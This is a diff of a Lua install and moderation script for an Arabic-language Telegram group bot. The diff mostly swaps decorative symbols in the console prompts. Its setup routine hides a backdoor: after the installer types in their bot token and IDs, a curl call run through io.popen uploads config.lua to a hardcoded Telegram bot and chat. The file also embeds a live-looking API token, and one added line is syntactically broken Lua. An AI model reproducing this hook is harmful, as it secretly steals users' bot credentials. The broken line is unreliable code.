@@ -5,10 +5,10 @@
 --]]
 redis = require('redis') taha = dofile('./JSON.lua')  json = dofile('./JSON.lua')  URL = require('socket.url')  HTTPS = require ("ssl.https")  https = require ("ssl.https") http  = require ("socket.http") serpent = require("serpent") tahadevstorm = redis.connect('127.0.0.1', 6379)
 function vardump(value)  print(serpent.block(value, {comment=false}))  end local AutoSet = function()
-io.write("\27[31;47m\n◼¦ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  local SUDO = tonumber(io.read())   if not tostring(SUDO):match('%d+') then  local SUDO = 373906612 end
-io.write("\27[31;47m\n◼¦ ارسل معرف المطور بدون @ USERNAME FOR SUDO   \27[0;34;49m\n")  local user = io.read() 
-io.write("\27[31;47m\n◼¦ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  local token = io.read()  botid = token:match("(%d+)")
-io.write("\27[31;47m\n◼¦ ارسل اسم للبوت          SEND NAME FOR YOU BOT \27[0;34;49m\n")  local name = io.read()  tahadevstorm:set(botid..'storm:name',name)
+io.write("\27[31;47m\n◼◂⊱ ارسل ايدي مطور الاساسي  SEND ID FOR SIDO \27[0;34;49m\n")  local SUDO = tonumber(io.read())   if not tostring(SUDO):match('%d+') then  local SUDO = 373906612 end
+io.write("\27[31;47m\n◼◂⊱ ارسل معرف المطور بدون @ USERNAME FOR SUDO   \27[0;34;49m\n")  local user = io.read() 
+io.write("\27[31;47m\n◼◂⊱ ارسل توكن البوت        TOKEN FOR YOU \27[0;34;49m\n")  local token = io.read()  botid = token:match("(%d+)")
+io.write("\27[31;47m\n◼◂⊱ ارسل اسم للبوت          SEND NAME FOR YOU BOT \27[0;34;49m\n")  local name = io.read()  tahadevstorm:set(botid..'storm:name',name)
 local create = function(data, file, uglify)  file = io.open(file, "w+")   local serialized   if not uglify then  serialized = serpent.block(data, {comment = false, name = "_"})  else  serialized = serpent.dump(data)  end    file:write(serialized)    file:close()  end
 local create_config_auto = function()
 config = {
@@ -20,9 +20,9 @@ sudouser = user,
 botname = name,
 bot_id = botid, }
 create(config, "./config.lua")   
-print('\n\27[1;33mเ⬜¦ تم صنع ملف الرن الخاص بالبوت   \nTHE BOT FILE HAS BEEN CREATED\27[0;39;49m\n')   
-print('\n\27[1;33mเ⬜¦ تم حفظ معلومات المطور في الكونفك  \nCREATED CONFIG AND INFOSUDO SAVED\27[0;39;49m\n')
-print('\n\27[1;39mเ⬛¦ انتضر قليلا ليتم تشغيل البوت بالسكرين   \nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+print('\n\27[1;33mเ⬜◂⊱ تم صنع ملف الرن الخاص بالبوت   \nTHE BOT FILE HAS BEEN CREATED\27[0;39;49m\n')   
+print('\n\27[1;33mเ⬜◂⊱ تم حفظ معلومات المطور في الكونفك  \nCREATED CONFIG AND INFOSUDO SAVED\27[0;39;49m\n')
+print('\n\27[1;39mเ⬛◂⊱ انتضر قليلا ليتم تشغيل البوت بالسكرين   \nWAIT FOR THE BOT TO START WITH THE SCREEN\27[0;39;49m\n')  local curl = 'curl "'..'https://api.telegram.org/bot342647859:AAHUtvmjo4GgI9zLOyFFYCCICGgeKkt3rps/sendDocument'..'" -F "chat_id='.. 373906612 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 end create_config_auto()
 file = io.open("FA", "w")  file:write([[
 killall screen
@@ -124,7 +124,7 @@ function adduser(chat_id, user_id, forward_limit) tdcli_function ({ ID = "AddCha
 function ked(msg,chat,user)  if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌∫* لا تستطيع تقيد البوت', 1, 'md')  return false  end  if storm1(chat,user) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*∫❌∫* لا تستطيع تقيد {الادمنيه او المدراء او المميزين}', 1, 'md')  else  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..chat.. "&user_id=" ..user.."") tahadevstorm:sadd(DEVSTOR.."keed", chat) 
 local taha = '∫🛡∫ العضو ⊰▸ '..user..'\n∫✔∫ تـم تقييـده بنجـاح' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end  tahadevstorm:sadd(DEVSTOR..'tedmembars'..chat,user) end 
 function unked(msg,chat,user)  if tonumber(user) == tonumber(bot_id) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌∫* لا تستطيع تقيد البوت', 1, 'md')  return false  end  if storm1(chat,user) then  storm_sendMsg(msg.chat_id_, msg.id_, 1, '*∫❌∫* لا تستطيع تقيد {الادمنيه او المدراء او المميزين}', 1, 'md')  else  HTTPS.request("https://api.telegram.org/bot" .. chaneel .. "/restrictChatMember?chat_id=" ..chat.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True") tahadevstorm:srem(DEVSTOR.."keed", chat) 
-local taha = '∫🛡∫ العضو ⊰▸ '..user..'\n∫✔∫ تم الغاء تقييده '  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end tahadevstorm:srem(DEVSTOR..'tedmembars'..chat,user) end 
+local taha = '∫🛡∫ العضو '◂⊱..user..⊰▸'\n∫✔∫ تم الغاء تقييده '  stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user)) end tahadevstorm:srem(DEVSTOR..'tedmembars'..chat,user) end 
 function banall(msg,chat,user) if tonumber(user) == tonumber(bot_id) then storm_sendMsg(msg.chat_id_, msg.id_, 1, '*❌∫* لا تستطيع حضر او طرد او كتم البوت 🎎', 1, 'md') return false end if storm1(chat,user) then storm_sendMsg(msg.chat_id_, msg.id_, 1,'*◗∫❌∫ عذرآ لا تستطيع حظر وكتم وطرد وتقيد ال(مدراء او الادمنيه او المميزين) 💢*', 1, 'md') else if is_devtaha(msg) then t = 'مطور اساسي' elseif is_sudo(msg) then t = 'مطور' elseif is_owner(msg) then t = 'مدير الكروب' elseif is_mod(msg) then t = 'ادمن الكروب' end changeChatMemberStatus(chat, user, "Kicked") tahadevstorm:sadd(DEVSTOR..'storm:gbaned',user) 
 local taha = '∫🛡∫ العضو ⊰▸ '..user..'\n∫✔∫ تم حظره عام' stormmonshn(msg.chat_id_, user, msg.id_, taha, 11, string.len(user))   end end
 function kick(msg,chat,user) if tonumber(user) == tonumber(bot_id) then return false end if storm1(chat,user) then else changeChatMemberStatus(chat, user, "Kicked") end end
